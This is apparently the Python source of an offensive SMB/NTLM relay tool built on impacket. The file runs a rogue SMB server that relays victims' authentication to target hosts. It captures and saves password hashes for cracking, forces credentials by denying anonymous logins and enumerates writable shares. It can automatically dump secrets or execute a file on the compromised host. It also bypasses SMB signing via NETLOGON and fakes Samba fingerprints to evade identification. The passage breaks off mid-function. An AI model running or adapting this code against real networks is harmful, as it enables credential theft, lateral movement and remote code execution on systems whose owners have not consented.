#!/usr/bin/env python
#
# Author: Jack Baker (https://github.com/qwokka/smbcommander)
#
# This product includes software developed by
# SecureAuth Corporation (https://www.secureauth.com/)."
#

import ConfigParser
import logging
import os
import sys
import time

from binascii import hexlify, unhexlify
from Queue import Queue
from struct import pack, unpack
from threading import Thread, Timer, Lock
from urlparse import urlparse

import socksserver
import utils

from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.nmb import NetBIOSTimeout
from impacket.nt_errors import ERROR_MESSAGES
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_SUCCESS, STATUS_ACCESS_DENIED,  \
    STATUS_NOT_SUPPORTED, STATUS_MORE_PROCESSING_REQUIRED
from impacket.ntlm import NTLMAuthChallengeResponse, NTLMAuthNegotiate, NTLMAuthChallenge,  \
    AV_PAIRS, NTLMSSP_AV_HOSTNAME, generateEncryptedSessionKey
from impacket.smb import NewSMBPacket, SMBCommand, SMB, SMBSessionSetupAndX_Data,           \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Parameters,    \
    SMBSessionSetupAndX_Extended_Response_Data, SMBSessionSetupAndX_Parameters,             \
    SMBSessionSetupAndX_Extended_Parameters, SMBSessionSetupAndXResponse_Parameters,        \
    TypesMech, SMBSessionSetupAndXResponse_Data
from impacket.smbconnection import SMBConnection
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile, SMBSERVER
from impacket.spnego import ASN1_AID, SPNEGO_NegTokenResp, SPNEGO_NegTokenInit

CODEC = sys.getdefaultencoding()
ATTACKED_HOSTS = set()

KEEP_ALIVE_TIMER = 30.0

class SMBCommanderServer(Thread):
    def __init__(self, output_file = None, auto_secretsdump = False,
                 auto_exec = False, auto_exec_file = None, socks = False,
                 service_name = None, one_shot = False):
        self.auto_secretsdump   = auto_secretsdump
        self.auto_exec          = auto_exec
        self.auto_exec_file     = auto_exec_file
        self.socks              = socks
        self.service_name       = service_name

        self.clients            = {}
        self.client_queue      = Queue()

        Thread.__init__(self)
        self.daemon = True
        self.server = None
        self.target = ''
        self.mode = 'REFLECTION'
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None
        self.exeFile = None
        self.returnStatus = STATUS_SUCCESS
        self.command = None
        self.one_shot = one_shot
        self.runSocks = False

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        if output_file is not None:
            smbConfig.set('global','jtr_dump_path', output_file)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        self.server = SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(SMB.SMB_COM_NEGOTIATE,
                                                              self.SmbComNegotiate)

        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(SMB.SMB_COM_SESSION_SETUP_ANDX,
                                                                  self.SmbSessionSetupAndX)

        self.server.addConnection('SMBRelay', '0.0.0.0', 445)

        self.activeSessionsWatcher = Thread(target=activeSessionsWatcher, args=(self, ))
        self.activeSessionsWatcher.daemon = True
        self.activeSessionsWatcher.start()

        self.keepAliveTimer = RepeatedTimer(KEEP_ALIVE_TIMER, keepAliveTimer, self)

        self.socks_server = None

    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.mode.upper() == 'REFLECTION':
            self.target = connData['ClientIP']
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]

        # Let's check if we already attacked this host.
        global ATTACKED_HOSTS
        if self.target in ATTACKED_HOSTS and self.one_shot is True:
            logging.info("SMBD: Received connection from %s, skipping %s, already attacked",
                         connData['ClientIP'], self.target)
            packet = NewSMBPacket()
            packet['Flags1'] = SMB.FLAGS1_REPLY
            packet['Flags2'] = SMB.FLAGS2_NT_STATUS
            packet['Command'] = recvPacket['Command']
            packet['Pid'] = recvPacket['Pid']
            packet['Tid'] = recvPacket['Tid']
            packet['Mid'] = recvPacket['Mid']
            packet['Uid'] = recvPacket['Uid']
            packet['Data'] = '\x00\x00\x00'
            errorCode = STATUS_NOT_SUPPORTED
            packet['ErrorCode'] = errorCode >> 16
            packet['ErrorClass'] = errorCode & 0xff

            return None, [packet], STATUS_NOT_SUPPORTED
        else:
            logging.info("SMBD: Received connection from %s, attacking target %s",
                         connData['ClientIP'] ,self.target)

        try:
            if recvPacket['Flags2'] & SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                if self.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    logging.info("Downgrading to standard security")
                    extSec = False
                    recvPacket['Flags2'] += (~SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True
            client = SMBClient(self.target, extended_security = extSec)
            client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
            client.set_timeout(60)
        except Exception, e:
            logging.error("Connection against target %s FAILED", self.target)
            logging.error(str(e))
        else:
            encryptionKey = client.get_encryption_key()
            smbData[self.target] = {}
            smbData[self.target]['SMBClient'] = client
            if encryptionKey is not None:
                connData['EncryptionKey'] = encryptionKey
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)
        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def run(self):
        if self.runSocks:
            self.socks_server = socksserver.CommanderSOCKS(self)
            self._socks_thread = Thread(target=self.socks_server.serve_forever)
            self._socks_thread.daemon = True
            self._socks_thread.start()

        self._start()

    def stop(self):
        for _, session in self.getSessions().iteritems():
            if session is None:
                continue

            session.close_session()

        if self.socks_server is not None:
            self.socks_server.shutdown()

        self.keepAliveTimer.stop()

    # We retain placeholders for closed sessions so that session IDs don't change whenever a 
    # session closes (Like Metasploit)
    def getSessions(self):
        result = {}

        for sess_id, client in self.clients.iteritems():
            if client is None:
                continue

            result[sess_id] = client.session._existingConnection

        return result

    def SmbSessionSetupAndX(self, connId, smbServer, smbCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        global ATTACKED_HOSTS

        if connData['_dialects_parameters']['Capabilities'] & SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = \
                            SMBSessionSetupAndX_Extended_Parameters(smbCommand['Parameters'])
            sessionSetupData = SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(smbCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
                token = blob['ResponseToken']
            else:
                # NEGOTIATE packet
                blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
                token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            messageType = unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                # Let's send it to the target server and send the answer back to the client.

                # Let's check if we already attacked this host.
                global ATTACKED_HOSTS
                if self.target in ATTACKED_HOSTS and self.one_shot is True:
                    logging.info("SMBD: Received connection from %s, skipping %s, already attacked",
                                 connData['ClientIP'], self.target)

                    packet = NewSMBPacket()
                    packet['Flags1'] = SMB.FLAGS1_REPLY
                    packet['Flags2'] = SMB.FLAGS2_NT_STATUS
                    packet['Command'] = recvPacket['Command']
                    packet['Pid'] = recvPacket['Pid']
                    packet['Tid'] = recvPacket['Tid']
                    packet['Mid'] = recvPacket['Mid']
                    packet['Uid'] = recvPacket['Uid']
                    packet['Data'] = '\x00\x00\x00'
                    errorCode = STATUS_NOT_SUPPORTED
                    packet['ErrorCode'] = errorCode >> 16
                    packet['ErrorClass'] = errorCode & 0xff

                    return None, [packet], STATUS_NOT_SUPPORTED

                # It might happen if the target connects back before a previous connection has
                # finished, we might
                # get to this function w/o having the dict and smbClient entry created, because a
                # NEGOTIATE_CONNECTION was not needed
                if smbData.has_key(self.target) is False:
                    smbData[self.target] = {}
                    smbClient = SMBClient(self.target)
                    smbClient.setDomainAccount(self.machineAccount,
                                               self.machineHashes,
                                               self.domainIp)

                    smbClient.set_timeout(60)
                    smbData[self.target]['SMBClient'] = smbClient

                smbClient = smbData[self.target]['SMBClient']
                clientChallengeMessage = smbClient.sendNegotiate(token)
                challengeMessage = NTLMAuthChallenge()
                challengeMessage.fromString(clientChallengeMessage)
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'
                respToken['SupportedMech'] = \
                    TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED
                # Let's set up an UID for this connection and store it
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10
                # Let's store it in the connection data
                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication

                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                smbClient = smbData[self.target]['SMBClient']
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                if authenticateMessage['user_name'] != '':
                    _, errorCode = smbClient.sendAuth(connData['CHALLENGE_MESSAGE']['challenge'],
                                                      sessionSetupData['SecurityBlob'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to
                    # send his credentials
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = NewSMBPacket()
                    packet['Flags1']  = SMB.FLAGS1_REPLY | SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = '\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff
                    # Reset the UID
                    smbClient.setUid(0)
                    logging.error("Authenticating against %s as %s\\%s FAILED",
                                  self.target,
                                  authenticateMessage['domain_name'],
                                  authenticateMessage['user_name'])

                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    logging.info("Authenticating against %s as %s\\%s SUCCEED",
                                 self.target,
                                 authenticateMessage['domain_name'],
                                 authenticateMessage['user_name'])

                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'],
                                                        authenticateMessage['ntlm'])
                    logging.info(ntlm_hash_data['hash_string'])

                    smbClient.username = authenticateMessage['user_name']
                    smbClient.domain = authenticateMessage['domain_name']

                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'],
                                              ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())

                    ATTACKED_HOSTS.add(self.target)

                    username    = authenticateMessage['user_name'].decode('utf-16le')
                    domain      = authenticateMessage['domain_name'].decode('utf-16le')

                    protocolClient          = SMBRelayClient(None,
                                                             urlparse('smb://%s' % self.target))
                    protocolClient.session  = SMBConnection(existingConnection=smbClient)
                    protocolClient.scheme   = 'SMB'
                    protocolClient.username = username
                    protocolClient.domain   = domain
                    protocolClient.data     = connData

                    del smbData[self.target]

                    connection = SMBConnection(existingConnection = smbClient)
                    shares = connection.listShares()

                    for share in shares:
                        name = share["shi1_netname"][:-1]
                        share.readable = utils.isShareReadable(connection, name)

                        if share.readable:
                            share.writable = utils.isShareWritable(connection, name)
                        else:
                            share.writable = False

                    smbClient.shares = shares

                    self.client_queue.put((self.target,
                                           445,
                                           'SMB',
                                           ('%s/%s' % (username, domain)).upper(),
                                           protocolClient,
                                           connData))

                # Now continue with the server
                #############################################################

                # Return status code of the authentication process.
                errorCode = self.returnStatus
                logging.info("Sending status code %s after authentication to %s",
                             ERROR_MESSAGES[self.returnStatus][0],
                             connData['ClientIP'])

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            respParameters = SMBSessionSetupAndXResponse_Parameters()
            respData       = SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = SMBSessionSetupAndX_Parameters(smbCommand['Parameters'])
            sessionSetupData = SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(smbCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']
            #############################################################
            # SMBRelay
            smbClient = smbData[self.target]['SMBClient']
            if sessionSetupData['Account'] != '':
                _, errorCode = smbClient.login_standard(sessionSetupData['Account'],
                                                        sessionSetupData['PrimaryDomain'],
                                                        sessionSetupData['AnsiPwd'],
                                                        sessionSetupData['UnicodePwd'])
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send
                # his credentials
                errorCode = STATUS_ACCESS_DENIED

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = NewSMBPacket()
                packet['Flags1']  = SMB.FLAGS1_REPLY | SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff
                # Reset the UID
                smbClient.setUid(0)
                return None, [packet], errorCode
                # Now continue with the server
            else:
                # We have a session, create a thread and do whatever we want
                ntlm_hash_data = outputToJohnFormat('',
                                                    sessionSetupData['Account'],
                                                    sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'],
                                                    sessionSetupData['UnicodePwd'])

                logging.info(ntlm_hash_data['hash_string'])
                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'],
                                          ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())
                # Target will be attacked, adding to the attacked set
                # If the attack fails, the doAttack thread will be responsible of removing
                # it from the set
                ATTACKED_HOSTS.add(self.target)

                del smbData[self.target]
                # Now continue with the server


            #############################################################

            # Do the verification here, for just now we grant access
            # TODO: Manage more UIDs for the same session
            errorCode = self.returnStatus
            logging.info("Sending status code %s after authentication to %s",
                         ERROR_MESSAGES[self.returnStatus][0],
                         connData['ClientIP'])

            connData['Uid'] = 10
            respParameters['Action'] = 0

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True
        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        if self.auto_secretsdump:
            utils.commander.tui.shell.output_info("Running secretsdump...")
            utils.secretsdump(smbClient)
        if self.auto_exec:
            utils.commander.tui.shell.output_info("Executing \"%s\"..."
                                                  % self.auto_exec_file)
            if self.auto_exec_file is not None:
                utils.psexec_file(smbClient, self.auto_exec_file)
            else:
                logging.warning("AUTOEXEC is enabled but AUTOEXEC_FILE is not set")

        return [respSMBCommand], None, errorCode

    def _start(self):
        self.server.serve_forever()

    def setTargets(self, targets):
        self.target = targets

    def setExeFile(self, filename):
        self.exeFile = filename

    def setCommand(self, command):
        self.command = command

    def setSocks(self, socks):
        self.runSocks = socks

    def setReturnStatus(self, returnStatus):
        # Specifies return status after successful relayed authentication to return
        # to the connecting client. This comes useful when we don't want the connecting
        # client to store successful credentials in his memory. Valid statuses:
        # STATUS_SUCCESS - denotes that the connecting client passed valid credentials,
        #                   which will make him store them accordingly.
        # STATUS_ACCESS_DENIED - may occur for instance when the client is not a Domain Admin,
        #                       and got configured Remote UAC, thus preventing connection to ADMIN$
        # STATUS_LOGON_FAILURE - which will tell the connecting client that the passed credentials
        #                       are invalid.
        self.returnStatus = {
            'success' : STATUS_SUCCESS,
            'denied' : STATUS_ACCESS_DENIED,
            'logon_failure' : STATUS_LOGON_FAILURE
        }[returnStatus.lower()]

    def setMode(self,mode, one_shot):
        self.mode = mode
        self.one_shot = one_shot

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp

class SMBClient(SMB):
    def __init__(self, remote_name, extended_security = True, sess_port = 445):
        self._extendedSecurity = extended_security
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None

        self.lock = Lock()

        SMB.__init__(self,remote_name, remote_name, sess_port = sess_port)

    def neg_session(self):
        neg_sess = SMB.neg_session(self, extended_security = self._extendedSecurity)
        return neg_sess

    def setUid(self,uid):
        self._uid = uid

    def login_standard(self, user, domain, ansiPwd, unicodePwd):
        smb = NewSMBPacket()
        smb['Flags1']  = 8

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Data()

        sessionSetup['Parameters']['MaxBuffer']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']      = 2
        sessionSetup['Parameters']['VCNumber']         = os.getpid()
        sessionSetup['Parameters']['SessionKey']       = self._dialects_parameters['SessionKey']
        sessionSetup['Parameters']['AnsiPwdLength']    = len(ansiPwd)
        sessionSetup['Parameters']['UnicodePwdLength'] = len(unicodePwd)
        sessionSetup['Parameters']['Capabilities']     = SMB.CAP_RAW_MODE

        sessionSetup['Data']['AnsiPwd']       = ansiPwd
        sessionSetup['Data']['UnicodePwd']    = unicodePwd
        sessionSetup['Data']['Account']       = str(user)
        sessionSetup['Data']['PrimaryDomain'] = str(domain)
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)

        self.sendSMB(smb)
        smb = self.recvSMB()
        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except:
            logging.error("Error login_standard")
            return None, STATUS_LOGON_FAILURE
        else:
            self._uid = smb['Uid']
            return smb, STATUS_SUCCESS

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp
        if self._SignatureRequired is True:
            if self.domainIp is None:
                logging.error("Signature is REQUIRED on the other end, attack will not work")
            else:
                logging.info("Signature is REQUIRED on the other end, using NETLOGON approach")


    def netlogonSessionKey(self, challenge, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        logging.info("Connecting to %s NETLOGON service", self.domainIp)

        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(respToken2['ResponseToken'] )
        _, machineAccount = self.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')

        try:
            av_pairs = authenticateMessage['ntlm'][44:]
            av_pairs = AV_PAIRS(av_pairs)

            serverName = av_pairs[NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
        except:
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.domainIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if len(self.machineHashes) > 0:
            lmhash, nthash = self.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(machineAccount,'', domainName, lmhash, nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', '12345678')

        serverChallenge = resp['ServerChallenge']

        if self.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.machineHashes.split(':')[1])

        sessionKey = nrpc.ComputeSessionKeyStrongKey('', '12345678', serverChallenge, ntHash)

        ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)

        nrpc.hNetrServerAuthenticate3(dce,
                                      NULL,
                                      machineAccount + '\x00',
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
                                      serverName + '\x00',
                                      ppp,
                                      0x600FFFFF)

        clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = \
            nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] =  \
            domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] =         \
            authenticateMessage['user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] =          \
            authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] =          \
            authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential,
                                                                     sessionKey)
        authenticator['Timestamp'] = 10

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = '\x00'*8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        #request.dump()
        try:
            resp = dce.request(request)
            #resp.dump()
        except DCERPCException, e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()

        logging.info("%s\\%s successfully validated through NETLOGON",
                     domainName,
                     authenticateMessage['user_name'].decode('utf-16le'))

        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != '':
            signingKey = generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'],
                encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']

        logging.info("SMB Signing key: %s ", hexlify(signingKey))

        self.set_session_key(signingKey)

        self._SignatureEnabled = True
        self._SignSequenceNumber = 2
        self.set_flags(flags1 = SMB.FLAGS1_PATHCASELESS, flags2 = SMB.FLAGS2_EXTENDED_SECURITY)
        return STATUS_SUCCESS

    def sendAuth(self, serverChallenge, authenticateMessageBlob):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired:
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = self._uid

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY |    \
                                                     SMB.CAP_USE_NT_ERRORS |        \
                                                     SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
        sessionSetup['Data']['SecurityBlob'] = str(authenticateMessageBlob)
        smb.addCommand(sessionSetup)
        self.sendSMB(smb)

        smb = self.recvSMB()
        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        if errorCode == STATUS_SUCCESS and      \
            self._SignatureRequired is True and \
            self.domainIp is not None:

            try:
                errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)
            except:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                raise

        return smb, errorCode

    def sendNegotiate(self, negotiateMessage):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired:
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY |    \
                                                     SMB.CAP_USE_NT_ERRORS |        \
                                                     SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit()

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
        smb = self.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            logging.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(
                                    sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            return respToken['ResponseToken']

def activeSessionsWatcher(server):
    while 1:
       # This call blocks until there is data, so it doesn't loop endlessly
        target, port, scheme, userName, client, data = server.client_queue.get()

        connection  = client.session._existingConnection

        con_login   = (connection.domain.decode('utf-16le') +
                      "/" +
                      connection.username.decode('utf-16le'))

        con_target  = connection.get_remote_host()

